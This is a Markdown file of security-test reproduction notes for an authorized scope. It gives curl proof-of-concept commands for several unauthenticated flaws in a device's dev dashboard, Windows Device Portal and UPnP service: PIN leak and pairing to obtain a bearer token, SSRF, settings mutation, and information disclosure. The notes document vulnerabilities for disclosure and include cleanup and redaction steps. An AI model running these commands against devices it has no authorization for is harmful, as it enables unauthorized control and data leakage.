# Reproduction Notes (owner-authorized estate only)

All tests below were run against `10.0.0.23` in a declared validation-only scope. Do **not** run against systems you do not own/authorize. Reversible tests were restored immediately.

## SPY-002 — dev dashboard control PIN disclosure + pairing (HIGH 8.0)
```bash
# Baseline: observe PIN in unauth status
curl -s http://10.0.0.23:9127/api/status | jq .control_code

# Attack: pair with leaked PIN (no auth)
curl -s -X POST --data-raw "<PIN>" http://10.0.0.23:9127/api/controls/pair
# => 200 with Bearer token

# Diff/cleanup: revoke token immediately
curl -s -X POST -H "Authorization: Bearer <TOKEN>" http://10.0.0.23:9127/api/controls/leave
```
No input injected.

## SPY-007 — SSRF via /api/download-url (MEDIUM 5.5)
```bash
# Baseline
curl -s http://10.0.0.23:9127/api/status | jq .last_error

# Attack (unauth, unreachable loopback target)
curl -s -X POST -H 'Content-Type: application/json' \
  --data '{"url":"http://127.0.0.1:1/probe","game":"probe"}' \
  http://10.0.0.23:9127/api/download-url

# Diff after settle
sleep 6; curl -s http://10.0.0.23:9127/api/status | jq .last_error
# => "URL download failed" (console attempted fetch)
```
No file written; `/games` unchanged.

## SPY-011 — Unauth settings mutation (MEDIUM 5.5, reversible)
```bash
curl -s http://10.0.0.23:9127/api/settings | jq .show_qr        # baseline
curl -s -X POST -H 'Content-Type: application/json' \
  --data '{"show_qr":false}' http://10.0.0.23:9127/api/settings # attack
curl -s http://10.0.0.23:9127/api/settings | jq .show_qr        # diff
curl -s -X POST -H 'Content-Type: application/json' \
  --data '{"show_qr":true}' http://10.0.0.23:9127/api/settings  # restore
```

## SPY-010 — Unauth file manifest disclosure (MEDIUM 5.5)
```bash
curl -s 'http://10.0.0.23:9127/api/list-files?game=hello' | jq .
```

## SPY-012/SPY-014 — WDP unauth info leaks (HIGH, redacted)
```bash
curl -sk https://10.0.0.23:11443/api/os/info
curl -sk https://10.0.0.23:11443/ext/settings
curl -sk https://10.0.0.23:11443/ext/xbox/info          # contains device IDs - redact
curl -sk https://10.0.0.23:11443/api/networking/ipconfig
curl -sk https://10.0.0.23:11443/api/app/packagemanager/packages
```
Redact ConsoleId/DeviceId/SerialNumber/cert expiry/user identifiers before sharing.

## SPY-013 — UPnP unauth SOAP read-only query (MEDIUM 5.5)
```bash
cat > /tmp/getvol.xml <<'XML'
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body><u:GetVolume xmlns:u="urn:schemas-upnp-org:service:RenderingControl:1"><InstanceID>0</InstanceID><Channel>Master</Channel></u:GetVolume></s:Body>
</s:Envelope>
XML
curl -s -H 'Content-Type: text/xml; charset="utf-8"' \
  -H 'SOAPACTION: "urn:schemas-upnp-org:service:RenderingControl:1#GetVolume"' \
  --data-binary @/tmp/getvol.xml \
  "http://10.0.0.23:2869/upnphost/udhisapi.dll?control=uuid:<UUID>+urn:upnp-org:serviceId:RenderingControl"
```
Read-only query only; do not invoke mutating actions without explicit authorization.
